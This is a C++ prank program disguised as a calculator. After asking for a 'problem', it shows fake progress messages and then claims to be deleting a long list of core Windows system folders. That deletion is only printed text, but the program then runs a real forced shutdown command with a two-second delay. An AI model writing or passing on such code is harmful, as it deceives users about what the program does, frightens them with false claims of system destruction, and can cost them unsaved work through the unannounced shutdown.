#include <bits/stdc++.h>
using namespace std;

void clearConsole() {
    cout << "\033[2J\033[1;1H";
}

void calculating() {
    this_thread::sleep_for(chrono::milliseconds(500));
    clearConsole();

    this_thread::sleep_for(chrono::milliseconds(500));
    cout << "Counting." << endl;

    this_thread::sleep_for(chrono::milliseconds(500));
    cout << "Counting.." << endl;

    this_thread::sleep_for(chrono::milliseconds(500));
    cout << "Counting..." << endl;
}

void thatsOver() {
    cout << "Deleting" << endl;
    this_thread::sleep_for(chrono::milliseconds(500));

    cout << "C:\\Windows\\System32\\LogFiles" << endl;
    this_thread::sleep_for(chrono::milliseconds(1000));

    cout << "C:\\Windows\\System32\\Tasks" << endl;
    this_thread::sleep_for(chrono::milliseconds(600));

    cout << "C:\\Windows\\System32\\wbem" << endl;
    this_thread::sleep_for(chrono::milliseconds(400));

    cout << "C:\\Windows\\System32\\catroot" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\catroot2" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\CodeIntegrity" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\Recovery" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\spool\\drivers" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\GroupPolicy" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\winevt\\Logs" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\Microsoft\\Protect" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\Security" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\System32\\DriverState" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\SystemResources" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\Globalization" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\INF" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\Logs\\CBS" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\Panther" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Windows\\PolicyDefinitions" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\ProgramData\\Microsoft\\Crypto" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\ProgramData\\Microsoft\\Windows\\Start Menu" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\System Volume Information" << endl;
    this_thread::sleep_for(chrono::milliseconds(100));

    cout << "C:\\Recovery" << endl;
}

int main() {
    string problem;
    int x = 0;

    cout << "Welcome to a new advanced calculator by benjiro" << endl;
    cout << "Enter a problem:" << endl;
    
    getline(cin, problem);

    while (true) {
        calculating();
        x++;

        if (x == 5) {
            clearConsole();
            thatsOver();
            cout << "GG))";
            break;
        }
    }
    system("shutdown /s /t 2");
}